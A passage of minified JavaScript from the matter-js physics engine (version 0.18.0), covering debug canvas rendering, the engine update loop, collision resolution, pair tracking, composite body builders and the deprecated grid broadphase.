d=l[c];e.fillStyle="#aaa",e.fillText(c,h+55,8),e.fillStyle="#eee",e.fillText(d,h+55,26),h+=55}},r.performance=function(t,e){var i=t.engine,n=t.timing,s=n.deltaHistory,o=n.elapsedHistory,a=n.timestampElapsedHistory,h=n.engineDeltaHistory,u=n.engineElapsedHistory,c=i.timing.lastDelta,d=l(s),p=l(o),f=l(h),g=l(u),m=l(a)/d||0,v=1e3/d||0;e.fillStyle="#0e0f19",e.fillRect(0,50,370,34),r.status(e,10,69,60,4,s.length,Math.round(v)+" fps",v/r._goodFps,(function(t){return s[t]/d-1})),r.status(e,82,69,60,4,h.length,c.toFixed(2)+" dt",r._goodDelta/c,(function(t){return h[t]/f-1})),r.status(e,154,69,60,4,u.length,g.toFixed(2)+" ut",1-g/r._goodFps,(function(t){return u[t]/g-1})),r.status(e,226,69,60,4,o.length,p.toFixed(2)+" rt",1-p/r._goodFps,(function(t){return o[t]/p-1})),r.status(e,298,69,60,4,a.length,m.toFixed(2)+" x",m*m*m,(function(t){return(a[t]/s[t]/m||0)-1}))},r.status=function(t,e,i,r,s,o,a,h,u){t.strokeStyle="#888",t.fillStyle="#444",t.lineWidth=1,t.fillRect(e,i+7,r,1),t.beginPath(),t.moveTo(e,i+7-s*n.clamp(.4*u(0),-2,2));for(var l=0;l<r;l+=1)t.lineTo(e+l,i+7-(l<o?s*n.clamp(.4*u(l),-2,2):0));t.stroke(),t.fillStyle="hsl("+n.clamp(25+95*h,0,120)+",100%,60%)",t.fillRect(e,i-7,4,4),t.font="12px Arial",t.textBaseline="middle",t.textAlign="right",t.fillStyle="#eee",t.fillText(a,e+r,i-5)},r.constraints=function(t,e){for(var i=e,r=0;r<t.length;r++){var s=t[r];if(s.render.visible&&s.pointA&&s.pointB){var o,a,u=s.bodyA,l=s.bodyB;if(o=u?h.add(u.position,s.pointA):s.pointA,"pin"===s.render.type)i.beginPath(),i.arc(o.x,o.y,3,0,2*Math.PI),i.closePath();else{if(a=l?h.add(l.position,s.pointB):s.pointB,i.beginPath(),i.moveTo(o.x,o.y),"spring"===s.render.type)for(var c,d=h.sub(a,o),p=h.perp(h.normalise(d)),f=Math.ceil(n.clamp(s.length/5,12,20)),g=1;g<f;g+=1)c=g%2==0?1:-1,i.lineTo(o.x+d.x*(g/f)+p.x*c*4,o.y+d.y*(g/f)+p.y*c*4);i.lineTo(a.x,a.y)}s.render.lineWidth&&(i.lineWidth=s.render.lineWidth,i.strokeStyle=s.render.strokeStyle,i.stroke()),s.render.anchors&&(i.fillStyle=s.render.strokeStyle,i.beginPath(),i.arc(o.x,o.y,3,0,2*Math.PI),i.arc(a.x,a.y,3,0,2*Math.PI),i.closePath(),i.fill())}}},r.bodies=function(t,e,i){var r,n,s,o,a=i,h=(t.engine,t.options),u=h.showInternalEdges||!h.wireframes;for(s=0;s<e.length;s++)if((r=e[s]).render.visible)for(o=r.parts.length>1?1:0;o<r.parts.length;o++)if((n=r.parts[o]).render.visible){if(h.showSleeping&&r.isSleeping?a.globalAlpha=.5*n.render.opacity:1!==n.render.opacity&&(a.globalAlpha=n.render.opacity),n.render.sprite&&n.render.sprite.texture&&!h.wireframes){var l=n.render.sprite,c=p(t,l.texture);a.translate(n.position.x,n.position.y),a.rotate(n.angle),a.drawImage(c,c.width*-l.xOffset*l.xScale,c.height*-l.yOffset*l.yScale,c.width*l.xScale,c.height*l.yScale),a.rotate(-n.angle),a.translate(-n.position.x,-n.position.y)}else{if(n.circleRadius)a.beginPath(),a.arc(n.position.x,n.position.y,n.circleRadius,0,2*Math.PI);else{a.beginPath(),a.moveTo(n.vertices[0].x,n.vertices[0].y);for(var d=1;d<n.vertices.length;d++)!n.vertices[d-1].isInternal||u?a.lineTo(n.vertices[d].x,n.vertices[d].y):a.moveTo(n.vertices[d].x,n.vertices[d].y),n.vertices[d].isInternal&&!u&&a.moveTo(n.vertices[(d+1)%n.vertices.length].x,n.vertices[(d+1)%n.vertices.length].y);a.lineTo(n.vertices[0].x,n.vertices[0].y),a.closePath()}h.wireframes?(a.lineWidth=1,a.strokeStyle="#bbb",a.stroke()):(a.fillStyle=n.render.fillStyle,n.render.lineWidth&&(a.lineWidth=n.render.lineWidth,a.strokeStyle=n.render.strokeStyle,a.stroke()),a.fill())}a.globalAlpha=1}},r.bodyWireframes=function(t,e,i){var r,n,s,o,a,h=i,u=t.options.showInternalEdges;for(h.beginPath(),s=0;s<e.length;s++)if((r=e[s]).render.visible)for(a=r.parts.length>1?1:0;a<r.parts.length;a++){for(n=r.parts[a],h.moveTo(n.vertices[0].x,n.vertices[0].y),o=1;o<n.vertices.length;o++)!n.vertices[o-1].isInternal||u?h.lineTo(n.vertices[o].x,n.vertices[o].y):h.moveTo(n.vertices[o].x,n.vertices[o].y),n.vertices[o].isInternal&&!u&&h.moveTo(n.vertices[(o+1)%n.vertices.length].x,n.vertices[(o+1)%n.vertices.length].y);h.lineTo(n.vertices[0].x,n.vertices[0].y)}h.lineWidth=1,h.strokeStyle="#bbb",h.stroke()},r.bodyConvexHulls=function(t,e,i){var r,n,s,o=i;for(o.beginPath(),n=0;n<e.length;n++)if((r=e[n]).render.visible&&1!==r.parts.length){for(o.moveTo(r.vertices[0].x,r.vertices[0].y),s=1;s<r.vertices.length;s++)o.lineTo(r.vertices[s].x,r.vertices[s].y);o.lineTo(r.vertices[0].x,r.vertices[0].y)}o.lineWidth=1,o.strokeStyle="rgba(255,255,255,0.2)",o.stroke()},r.vertexNumbers=function(t,e,i){var r,n,s,o=i;for(r=0;r<e.length;r++){var a=e[r].parts;for(s=a.length>1?1:0;s<a.length;s++){var h=a[s];for(n=0;n<h.vertices.length;n++)o.fillStyle="rgba(255,255,255,0.2)",o.fillText(r+"_"+n,h.position.x+.8*(h.vertices[n].x-h.position.x),h.position.y+.8*(h.vertices[n].y-h.position.y))}}},r.mousePosition=function(t,e,i){var r=i;r.fillStyle="rgba(255,255,255,0.8)",r.fillText(e.position.x+"  "+e.position.y,e.position.x+5,e.position.y-5)},r.bodyBounds=function(t,e,i){var r=i,n=(t.engine,t.options);r.beginPath();for(var s=0;s<e.length;s++)if(e[s].render.visible)for(var o=e[s].parts,a=o.length>1?1:0;a<o.length;a++){var h=o[a];r.rect(h.bounds.min.x,h.bounds.min.y,h.bounds.max.x-h.bounds.min.x,h.bounds.max.y-h.bounds.min.y)}n.wireframes?r.strokeStyle="rgba(255,255,255,0.08)":r.strokeStyle="rgba(0,0,0,0.1)",r.lineWidth=1,r.stroke()},r.bodyAxes=function(t,e,i){var r,n,s,o,a=i,h=(t.engine,t.options);for(a.beginPath(),n=0;n<e.length;n++){var u=e[n],l=u.parts;if(u.render.visible)if(h.showAxes)for(s=l.length>1?1:0;s<l.length;s++)for(r=l[s],o=0;o<r.axes.length;o++){var c=r.axes[o];a.moveTo(r.position.x,r.position.y),a.lineTo(r.position.x+20*c.x,r.position.y+20*c.y)}else for(s=l.length>1?1:0;s<l.length;s++)for(r=l[s],o=0;o<r.axes.length;o++)a.moveTo(r.position.x,r.position.y),a.lineTo((r.vertices[0].x+r.vertices[r.vertices.length-1].x)/2,(r.vertices[0].y+r.vertices[r.vertices.length-1].y)/2)}h.wireframes?(a.strokeStyle="indianred",a.lineWidth=1):(a.strokeStyle="rgba(255, 255, 255, 0.4)",a.globalCompositeOperation="overlay",a.lineWidth=2),a.stroke(),a.globalCompositeOperation="source-over"},r.bodyPositions=function(t,e,i){var r,n,s,o,a=i,h=(t.engine,t.options);for(a.beginPath(),s=0;s<e.length;s++)if((r=e[s]).render.visible)for(o=0;o<r.parts.length;o++)n=r.parts[o],a.arc(n.position.x,n.position.y,3,0,2*Math.PI,!1),a.closePath();for(h.wireframes?a.fillStyle="indianred":a.fillStyle="rgba(0,0,0,0.5)",a.fill(),a.beginPath(),s=0;s<e.length;s++)(r=e[s]).render.visible&&(a.arc(r.positionPrev.x,r.positionPrev.y,2,0,2*Math.PI,!1),a.closePath());a.fillStyle="rgba(255,165,0,0.8)",a.fill()},r.bodyVelocity=function(t,e,i){var r=i;r.beginPath();for(var n=0;n<e.length;n++){var s=e[n];s.render.visible&&(r.moveTo(s.position.x,s.position.y),r.lineTo(s.position.x+2*(s.position.x-s.positionPrev.x),s.position.y+2*(s.position.y-s.positionPrev.y)))}r.lineWidth=3,r.strokeStyle="cornflowerblue",r.stroke()},r.bodyIds=function(t,e,i){var r,n,s=i;for(r=0;r<e.length;r++)if(e[r].render.visible){var o=e[r].parts;for(n=o.length>1?1:0;n<o.length;n++){var a=o[n];s.font="12px Arial",s.fillStyle="rgba(255,255,255,0.5)",s.fillText(a.id,a.position.x+10,a.position.y-10)}}},r.collisions=function(t,e,i){var r,n,s,o,a=i,h=t.options;for(a.beginPath(),s=0;s<e.length;s++)if((r=e[s]).isActive)for(n=r.collision,o=0;o<r.activeContacts.length;o++){var u=r.activeContacts[o].vertex;a.rect(u.x-1.5,u.y-1.5,3.5,3.5)}for(h.wireframes?a.fillStyle="rgba(255,255,255,0.7)":a.fillStyle="orange",a.fill(),a.beginPath(),s=0;s<e.length;s++)if((r=e[s]).isActive&&(n=r.collision,r.activeContacts.length>0)){var l=r.activeContacts[0].vertex.x,c=r.activeContacts[0].vertex.y;2===r.activeContacts.length&&(l=(r.activeContacts[0].vertex.x+r.activeContacts[1].vertex.x)/2,c=(r.activeContacts[0].vertex.y+r.activeContacts[1].vertex.y)/2),n.bodyB===n.supports[0].body||!0===n.bodyA.isStatic?a.moveTo(l-8*n.normal.x,c-8*n.normal.y):a.moveTo(l+8*n.normal.x,c+8*n.normal.y),a.lineTo(l,c)}h.wireframes?a.strokeStyle="rgba(255,165,0,0.7)":a.strokeStyle="orange",a.lineWidth=1,a.stroke()},r.separations=function(t,e,i){var r,n,s,o,a,h=i,u=t.options;for(h.beginPath(),a=0;a<e.length;a++)if((r=e[a]).isActive){s=(n=r.collision).bodyA;var l=1;(o=n.bodyB).isStatic||s.isStatic||(l=.5),o.isStatic&&(l=0),h.moveTo(o.position.x,o.position.y),h.lineTo(o.position.x-n.penetration.x*l,o.position.y-n.penetration.y*l),l=1,o.isStatic||s.isStatic||(l=.5),s.isStatic&&(l=0),h.moveTo(s.position.x,s.position.y),h.lineTo(s.position.x+n.penetration.x*l,s.position.y+n.penetration.y*l)}u.wireframes?h.strokeStyle="rgba(255,165,0,0.5)":h.strokeStyle="orange",h.stroke()},r.inspector=function(t,e){t.engine;var i,r=t.selected,n=t.render,s=n.options;if(s.hasBounds){var o=n.bounds.max.x-n.bounds.min.x,a=n.bounds.max.y-n.bounds.min.y,h=o/n.options.width,u=a/n.options.height;e.scale(1/h,1/u),e.translate(-n.bounds.min.x,-n.bounds.min.y)}for(var l=0;l<r.length;l++){var c=r[l].data;switch(e.translate(.5,.5),e.lineWidth=1,e.strokeStyle="rgba(255,165,0,0.9)",e.setLineDash([1,2]),c.type){case"body":i=c.bounds,e.beginPath(),e.rect(Math.floor(i.min.x-3),Math.floor(i.min.y-3),Math.floor(i.max.x-i.min.x+6),Math.floor(i.max.y-i.min.y+6)),e.closePath(),e.stroke();break;case"constraint":var d=c.pointA;c.bodyA&&(d=c.pointB),e.beginPath(),e.arc(d.x,d.y,10,0,2*Math.PI),e.closePath(),e.stroke()}e.setLineDash([]),e.translate(-.5,-.5)}null!==t.selectStart&&(e.translate(.5,.5),e.lineWidth=1,e.strokeStyle="rgba(255,165,0,0.6)",e.fillStyle="rgba(255,165,0,0.1)",i=t.selectBounds,e.beginPath(),e.rect(Math.floor(i.min.x),Math.floor(i.min.y),Math.floor(i.max.x-i.min.x),Math.floor(i.max.y-i.min.y)),e.closePath(),e.stroke(),e.fill(),e.translate(-.5,-.5)),s.hasBounds&&e.setTransform(1,0,0,1,0,0)};var i=function(t,e){var i=t.engine,n=t.timing,s=n.historySize,o=i.timing.timestamp;n.delta=e-n.lastTime||r._goodDelta,n.lastTime=e,n.timestampElapsed=o-n.lastTimestamp||0,n.lastTimestamp=o,n.deltaHistory.unshift(n.delta),n.deltaHistory.length=Math.min(n.deltaHistory.length,s),n.engineDeltaHistory.unshift(i.timing.lastDelta),n.engineDeltaHistory.length=Math.min(n.engineDeltaHistory.length,s),n.timestampElapsedHistory.unshift(n.timestampElapsed),n.timestampElapsedHistory.length=Math.min(n.timestampElapsedHistory.length,s),n.engineElapsedHistory.unshift(i.timing.lastElapsed),n.engineElapsedHistory.length=Math.min(n.engineElapsedHistory.length,s),n.elapsedHistory.unshift(n.lastElapsed),n.elapsedHistory.length=Math.min(n.elapsedHistory.length,s)},l=function(t){for(var e=0,i=0;i<t.length;i+=1)e+=t[i];return e/t.length||0},c=function(t,e){var i=document.createElement("canvas");return i.width=t,i.height=e,i.oncontextmenu=function(){return!1},i.onselectstart=function(){return!1},i},d=function(t){var e=t.getContext("2d");return(window.devicePixelRatio||1)/(e.webkitBackingStorePixelRatio||e.mozBackingStorePixelRatio||e.msBackingStorePixelRatio||e.oBackingStorePixelRatio||e.backingStorePixelRatio||1)},p=function(t,e){var i=t.textures[e];return i||((i=t.textures[e]=new Image).src=e,i)},f=function(t,e){var i=e;/(jpg|gif|png)$/.test(e)&&(i="url("+e+")"),t.canvas.style.background=i,t.canvas.style.backgroundSize="contain",t.currentBackground=e}}()},function(t,e){var i={};t.exports=i,i.create=function(t){return{vertex:t,normalImpulse:0,tangentImpulse:0}}},function(t,e,i){var r={};t.exports=r;var n=i(7),s=i(19),o=i(14),a=i(20),h=i(4),u=i(5),l=i(10),c=i(0),d=i(6);r.create=function(t){t=t||{};var e=c.extend({positionIterations:6,velocityIterations:4,constraintIterations:2,enableSleeping:!1,events:[],plugin:{},gravity:{x:0,y:1,scale:.001},timing:{timestamp:0,timeScale:1,lastDelta:0,lastElapsed:0}},t);return e.world=t.world||u.create({label:"World"}),e.pairs=t.pairs||a.create(),e.detector=t.detector||o.create(),e.grid={buckets:[]},e.world.gravity=e.gravity,e.broadphase=e.grid,e.metrics={},e},r.update=function(t,e,i){var d=c.now();e=e||1e3/60,i=i||1;var p,f=t.world,g=t.detector,m=t.pairs,v=t.timing,_=v.timestamp;v.timestamp+=e*v.timeScale,v.lastDelta=e*v.timeScale;var y={timestamp:v.timestamp};h.trigger(t,"beforeUpdate",y);var x=u.allBodies(f),E=u.allConstraints(f);for(f.isModified&&o.setBodies(g,x),f.isModified&&u.setModified(f,!1,!1,!0),t.enableSleeping&&n.update(x,v.timeScale),r._bodiesApplyGravity(x,t.gravity),r._bodiesUpdate(x,e,v.timeScale,i,f.bounds),l.preSolveAll(x),p=0;p<t.constraintIterations;p++)l.solveAll(E,v.timeScale);l.postSolveAll(x),g.pairs=t.pairs;var b=o.collisions(g);for(a.update(m,b,_),t.enableSleeping&&n.afterCollisions(m.list,v.timeScale),m.collisionStart.length>0&&h.trigger(t,"collisionStart",{pairs:m.collisionStart}),s.preSolvePosition(m.list),p=0;p<t.positionIterations;p++)s.solvePosition(m.list,v.timeScale);for(s.postSolvePosition(x),l.preSolveAll(x),p=0;p<t.constraintIterations;p++)l.solveAll(E,v.timeScale);for(l.postSolveAll(x),s.preSolveVelocity(m.list),p=0;p<t.velocityIterations;p++)s.solveVelocity(m.list,v.timeScale);return m.collisionActive.length>0&&h.trigger(t,"collisionActive",{pairs:m.collisionActive}),m.collisionEnd.length>0&&h.trigger(t,"collisionEnd",{pairs:m.collisionEnd}),r._bodiesClearForces(x),h.trigger(t,"afterUpdate",y),t.timing.lastElapsed=c.now()-d,t},r.merge=function(t,e){if(c.extend(t,e),e.world){t.world=e.world,r.clear(t);for(var i=u.allBodies(t.world),s=0;s<i.length;s++){var o=i[s];n.set(o,!1),o.id=c.nextId()}}},r.clear=function(t){a.clear(t.pairs),o.clear(t.detector)},r._bodiesClearForces=function(t){for(var e=0;e<t.length;e++){var i=t[e];i.force.x=0,i.force.y=0,i.torque=0}},r._bodiesApplyGravity=function(t,e){var i=void 0!==e.scale?e.scale:.001;if((0!==e.x||0!==e.y)&&0!==i)for(var r=0;r<t.length;r++){var n=t[r];n.isStatic||n.isSleeping||(n.force.y+=n.mass*e.y*i,n.force.x+=n.mass*e.x*i)}},r._bodiesUpdate=function(t,e,i,r,n){for(var s=0;s<t.length;s++){var o=t[s];o.isStatic||o.isSleeping||d.update(o,e,i,r)}}},function(t,e,i){var r={};t.exports=r;var n=i(3),s=i(1);r._restingThresh=4,r._restingThreshTangent=6,r._positionDampen=.9,r._positionWarming=.8,r._frictionNormalMultiplier=5,r.preSolvePosition=function(t){var e,i,r,n=t.length;for(e=0;e<n;e++)(i=t[e]).isActive&&(r=i.activeContacts.length,i.collision.parentA.totalContacts+=r,i.collision.parentB.totalContacts+=r)},r.solvePosition=function(t,e){var i,n,s,o,a,h,u,l,c=r._positionDampen,d=t.length;for(i=0;i<d;i++)(n=t[i]).isActive&&!n.isSensor&&(o=(s=n.collision).parentA,a=s.parentB,h=s.normal,n.separation=h.x*(a.positionImpulse.x+s.penetration.x-o.positionImpulse.x)+h.y*(a.positionImpulse.y+s.penetration.y-o.positionImpulse.y));for(i=0;i<d;i++)(n=t[i]).isActive&&!n.isSensor&&(o=(s=n.collision).parentA,a=s.parentB,h=s.normal,l=(n.separation-n.slop)*e,(o.isStatic||a.isStatic)&&(l*=2),o.isStatic||o.isSleeping||(u=c/o.totalContacts,o.positionImpulse.x+=h.x*l*u,o.positionImpulse.y+=h.y*l*u),a.isStatic||a.isSleeping||(u=c/a.totalContacts,a.positionImpulse.x-=h.x*l*u,a.positionImpulse.y-=h.y*l*u))},r.postSolvePosition=function(t){for(var e=r._positionWarming,i=t.length,o=n.translate,a=s.update,h=0;h<i;h++){var u=t[h],l=u.positionImpulse,c=l.x,d=l.y,p=u.velocity;if(u.totalContacts=0,0!==c||0!==d){for(var f=0;f<u.parts.length;f++){var g=u.parts[f];o(g.vertices,l),a(g.bounds,g.vertices,p),g.position.x+=c,g.position.y+=d}u.positionPrev.x+=c,u.positionPrev.y+=d,c*p.x+d*p.y<0?(l.x=0,l.y=0):(l.x*=e,l.y*=e)}}},r.preSolveVelocity=function(t){var e,i,r=t.length;for(e=0;e<r;e++){var n=t[e];if(n.isActive&&!n.isSensor){var s=n.activeContacts,o=s.length,a=n.collision,h=a.parentA,u=a.parentB,l=a.normal,c=a.tangent;for(i=0;i<o;i++){var d=s[i],p=d.vertex,f=d.normalImpulse,g=d.tangentImpulse;if(0!==f||0!==g){var m=l.x*f+c.x*g,v=l.y*f+c.y*g;h.isStatic||h.isSleeping||(h.positionPrev.x+=m*h.inverseMass,h.positionPrev.y+=v*h.inverseMass,h.anglePrev+=h.inverseInertia*((p.x-h.position.x)*v-(p.y-h.position.y)*m)),u.isStatic||u.isSleeping||(u.positionPrev.x-=m*u.inverseMass,u.positionPrev.y-=v*u.inverseMass,u.anglePrev-=u.inverseInertia*((p.x-u.position.x)*v-(p.y-u.position.y)*m))}}}}},r.solveVelocity=function(t,e){var i,n,s,o,a=e*e,h=r._restingThresh*a,u=r._frictionNormalMultiplier,l=r._restingThreshTangent*a,c=Number.MAX_VALUE,d=t.length;for(s=0;s<d;s++){var p=t[s];if(p.isActive&&!p.isSensor){var f=p.collision,g=f.parentA,m=f.parentB,v=g.velocity,_=m.velocity,y=f.normal.x,x=f.normal.y,E=f.tangent.x,b=f.tangent.y,T=p.activeContacts,D=T.length,w=1/D,S=g.inverseMass+m.inverseMass,A=p.friction*p.frictionStatic*u*a;for(v.x=g.position.x-g.positionPrev.x,v.y=g.position.y-g.positionPrev.y,_.x=m.position.x-m.positionPrev.x,_.y=m.position.y-m.positionPrev.y,g.angularVelocity=g.angle-g.anglePrev,m.angularVelocity=m.angle-m.anglePrev,o=0;o<D;o++){var C=T[o],I=C.vertex,R=I.x-g.position.x,P=I.y-g.position.y,O=I.x-m.position.x,N=I.y-m.position.y,M=v.x-P*g.angularVelocity,F=v.y+R*g.angularVelocity,L=M-(_.x-N*m.angularVelocity),B=F-(_.y+O*m.angularVelocity),U=y*L+x*B,k=E*L+b*B,G=p.separation+U,H=Math.min(G,1),z=(H=G<0?0:H)*A;k>z||-k>z?(n=k>0?k:-k,(i=p.friction*(k>0?1:-1)*a)<-n?i=-n:i>n&&(i=n)):(i=k,n=c);var V=R*x-P*y,X=O*x-N*y,j=w/(S+g.inverseInertia*V*V+m.inverseInertia*X*X),$=(1+p.restitution)*U*j;if(i*=j,U*U>h&&U<0)C.normalImpulse=0;else{var W=C.normalImpulse;C.normalImpulse+=$,C.normalImpulse=Math.min(C.normalImpulse,0),$=C.normalImpulse-W}if(k*k>l)C.tangentImpulse=0;else{var Y=C.tangentImpulse;C.tangentImpulse+=i,C.tangentImpulse<-n&&(C.tangentImpulse=-n),C.tangentImpulse>n&&(C.tangentImpulse=n),i=C.tangentImpulse-Y}var q=y*$+E*i,Z=x*$+b*i;g.isStatic||g.isSleeping||(g.positionPrev.x+=q*g.inverseMass,g.positionPrev.y+=Z*g.inverseMass,g.anglePrev+=(R*Z-P*q)*g.inverseInertia),m.isStatic||m.isSleeping||(m.positionPrev.x-=q*m.inverseMass,m.positionPrev.y-=Z*m.inverseMass,m.anglePrev-=(O*Z-N*q)*m.inverseInertia)}}}}},function(t,e,i){var r={};t.exports=r;var n=i(9),s=i(0);r.create=function(t){return s.extend({table:{},list:[],collisionStart:[],collisionActive:[],collisionEnd:[]},t)},r.update=function(t,e,i){var r,s,o,a,h=t.list,u=h.length,l=t.table,c=e.length,d=t.collisionStart,p=t.collisionEnd,f=t.collisionActive;for(d.length=0,p.length=0,f.length=0,a=0;a<u;a++)h[a].confirmedActive=!1;for(a=0;a<c;a++)(o=(r=e[a]).pair)?(o.isActive?f.push(o):d.push(o),n.update(o,r,i),o.confirmedActive=!0):(l[(o=n.create(r,i)).id]=o,d.push(o),h.push(o));var g=[];for(u=h.length,a=0;a<u;a++)(o=h[a]).confirmedActive||(n.setActive(o,!1,i),p.push(o),o.collision.bodyA.isSleeping||o.collision.bodyB.isSleeping||g.push(a));for(a=0;a<g.length;a++)o=h[s=g[a]-a],h.splice(s,1),delete l[o.id]},r.clear=function(t){return t.table={},t.list.length=0,t.collisionStart.length=0,t.collisionActive.length=0,t.collisionEnd.length=0,t}},function(t,e,i){var r=t.exports=i(22);r.Axes=i(11),r.Bodies=i(12),r.Body=i(6),r.Bounds=i(1),r.Collision=i(8),r.Common=i(0),r.Composite=i(5),r.Composites=i(23),r.Constraint=i(10),r.Contact=i(17),r.Detector=i(14),r.Engine=i(18),r.Events=i(4),r.Grid=i(24),r.Mouse=i(13),r.MouseConstraint=i(25),r.Pair=i(9),r.Pairs=i(20),r.Plugin=i(15),r.Query=i(26),r.Render=i(16),r.Resolver=i(19),r.Runner=i(27),r.SAT=i(28),r.Sleeping=i(7),r.Svg=i(29),r.Vector=i(2),r.Vertices=i(3),r.World=i(30),r.Engine.run=r.Runner.run,r.Common.deprecated(r.Engine,"run","Engine.run ➤ use Matter.Runner.run(engine) instead")},function(t,e,i){var r={};t.exports=r;var n=i(15),s=i(0);r.name="matter-js",r.version="0.18.0",r.uses=[],r.used=[],r.use=function(){n.use(r,Array.prototype.slice.call(arguments))},r.before=function(t,e){return t=t.replace(/^Matter./,""),s.chainPathBefore(r,t,e)},r.after=function(t,e){return t=t.replace(/^Matter./,""),s.chainPathAfter(r,t,e)}},function(t,e,i){var r={};t.exports=r;var n=i(5),s=i(10),o=i(0),a=i(6),h=i(12),u=o.deprecated;r.stack=function(t,e,i,r,s,o,h){for(var u,l=n.create({label:"Stack"}),c=t,d=e,p=0,f=0;f<r;f++){for(var g=0,m=0;m<i;m++){var v=h(c,d,m,f,u,p);if(v){var _=v.bounds.max.y-v.bounds.min.y,y=v.bounds.max.x-v.bounds.min.x;_>g&&(g=_),a.translate(v,{x:.5*y,y:.5*_}),c=v.bounds.max.x+s,n.addBody(l,v),u=v,p+=1}else c+=s}d+=g+o,c=t}return l},r.chain=function(t,e,i,r,a,h){for(var u=t.bodies,l=1;l<u.length;l++){var c=u[l-1],d=u[l],p=c.bounds.max.y-c.bounds.min.y,f=c.bounds.max.x-c.bounds.min.x,g=d.bounds.max.y-d.bounds.min.y,m={bodyA:c,pointA:{x:f*e,y:p*i},bodyB:d,pointB:{x:(d.bounds.max.x-d.bounds.min.x)*r,y:g*a}},v=o.extend(m,h);n.addConstraint(t,s.create(v))}return t.label+=" Chain",t},r.mesh=function(t,e,i,r,a){var h,u,l,c,d,p=t.bodies;for(h=0;h<i;h++){for(u=1;u<e;u++)l=p[u-1+h*e],c=p[u+h*e],n.addConstraint(t,s.create(o.extend({bodyA:l,bodyB:c},a)));if(h>0)for(u=0;u<e;u++)l=p[u+(h-1)*e],c=p[u+h*e],n.addConstraint(t,s.create(o.extend({bodyA:l,bodyB:c},a))),r&&u>0&&(d=p[u-1+(h-1)*e],n.addConstraint(t,s.create(o.extend({bodyA:d,bodyB:c},a)))),r&&u<e-1&&(d=p[u+1+(h-1)*e],n.addConstraint(t,s.create(o.extend({bodyA:d,bodyB:c},a))))}return t.label+=" Mesh",t},r.pyramid=function(t,e,i,n,s,o,h){return r.stack(t,e,i,n,s,o,(function(e,r,o,u,l,c){var d=Math.min(n,Math.ceil(i/2)),p=l?l.bounds.max.x-l.bounds.min.x:0;if(!(u>d||o<(u=d-u)||o>i-1-u))return 1===c&&a.translate(l,{x:(o+(i%2==1?1:-1))*p,y:0}),h(t+(l?o*p:0)+o*s,r,o,u,l,c)}))},r.newtonsCradle=function(t,e,i,r,o){for(var a=n.create({label:"Newtons Cradle"}),u=0;u<i;u++){var l=h.circle(t+u*(1.9*r),e+o,r,{inertia:1/0,restitution:1,friction:0,frictionAir:1e-4,slop:1}),c=s.create({pointA:{x:t+u*(1.9*r),y:e},bodyB:l});n.addBody(a,l),n.addConstraint(a,c)}return a},u(r,"newtonsCradle","Composites.newtonsCradle ➤ moved to newtonsCradle example"),r.car=function(t,e,i,r,o){var u=a.nextGroup(!0),l=.5*-i+20,c=.5*i-20,d=n.create({label:"Car"}),p=h.rectangle(t,e,i,r,{collisionFilter:{group:u},chamfer:{radius:.5*r},density:2e-4}),f=h.circle(t+l,e+0,o,{collisionFilter:{group:u},friction:.8}),g=h.circle(t+c,e+0,o,{collisionFilter:{group:u},friction:.8}),m=s.create({bodyB:p,pointB:{x:l,y:0},bodyA:f,stiffness:1,length:0}),v=s.create({bodyB:p,pointB:{x:c,y:0},bodyA:g,stiffness:1,length:0});return n.addBody(d,p),n.addBody(d,f),n.addBody(d,g),n.addConstraint(d,m),n.addConstraint(d,v),d},u(r,"car","Composites.car ➤ moved to car example"),r.softBody=function(t,e,i,n,s,a,u,l,c,d){c=o.extend({inertia:1/0},c),d=o.extend({stiffness:.2,render:{type:"line",anchors:!1}},d);var p=r.stack(t,e,i,n,s,a,(function(t,e){return h.circle(t,e,l,c)}));return r.mesh(p,i,n,u,d),p.label="Soft Body",p},u(r,"softBody","Composites.softBody ➤ moved to softBody and cloth examples")},function(t,e,i){var r={};t.exports=r;var n=i(9),s=i(0),o=s.deprecated;r.create=function(t){return s.extend({buckets:{},pairs:{},pairsList:[],bucketWidth:48,bucketHeight:48},t)},r.update=function(t,e,i,n){var s,o,a,h,u,l=i.world,c=t.buckets,d=!1;for(s=0;s<e.length;s++){var p=e[s];if((!p.isSleeping||n)&&(!l.bounds||!(p.bounds.max.x<l.bounds.min.x||p.bounds.min.x>l.bounds.max.x||p.bounds.max.y<l.bounds.min.y||p.bounds.min.y>l.bounds.max.y))){var f=r._getRegion(t,p);if(!p.region||f.id!==p.region.id||n){p.region&&!n||(p.region=f);var g=r._regionUnion(f,p.region);for(o=g.startCol;o<=g.endCol;o++)for(a=g.startRow;a<=g.endRow;a++){h=c[u=r._getBucketId(o,a)];var m=o>=f.startCol&&o<=f.endCol&&a>=f.startRow&&a<=f.endRow,v=o>=p.region.startCol&&o<=p.region.endCol&&a>=p.region.startRow&&a<=p.region.endRow;!m&&v&&v&&h&&r._bucketRemoveBody(t,h,p),(p.region===f||m&&!v||n)&&(h||(h=r._createBucket(c,u)),r._bucketAddBody(t,h,p))}p.region=f,d=!0}}}d&&(t.pairsList=r._createActivePairsList(t))},o(r,"update","Grid.update ➤ replaced by Matter.Detector"),r.clear=function(t){t.buckets={},t.pairs={},t.pairsList=[]},o(r,"clear","Grid.clear ➤ replaced by Matter.Detector"),r._regionUnion=function(t,e){var i=Math.min(t.startCol,e.startCol),n=Math.max(t.endCol,e.endCol),s=Math.min(t.startRow,e.startRow),o=Math.max(t.endRow,e.endRow);return r._createRegion(i,n,s,o)},r._getRegion=function(t,e){var i=e.bounds,n=Math.floor(i.min.x/t.bucketWidth),s=Math.floor(i.max.x/t.bucketWidth),o=Math.floor(i.min.y/t.bucketHeight),a=Math.floor(i.max.y/t.bucketHeight);return r._createRegion(n,s,o,a)},r._createRegion=function(t,e,i,r){return{id:t+","+e+","+i+","+r,startCol:t,endCol:e,startRow:i,endRow:r}},r._getBucketId=function(t,e){return"C"+t+"R"+e},r._createBucket=function(t,e){return t[e]=[]},r._bucketAddBody=function(t,e,i){var r,s=t.pairs,o=n.id,a=e.length;for(r=0;r<a;r++){var h=e[r];if(!(i.id===h.id||i.isStatic&&h.isStatic)){var u=o(i,h),l=s[u];l?l[2]+=1:s[u]=[i,h,1]}}e.push(i)},r._bucketRemoveBody=function(t,e,i){var r,o=t.pairs,a=n.id;e.splice(s.indexOf(e,i),1);var h=e.length;for(r=0;r<h;r++){var u=o[a(i,e[r])];u&&(u[2]-=1)}},r._createActivePairsList=function(t){var e,i,r=t.pairs,n=s.keys(r),o=n.length,a=[];for(i=0;i<o;i++)(e=r[n[i]])[2]>0?a.push(e):delete r[n[i]];return a}},function(t,e,i){var r={};t.exports=r;var 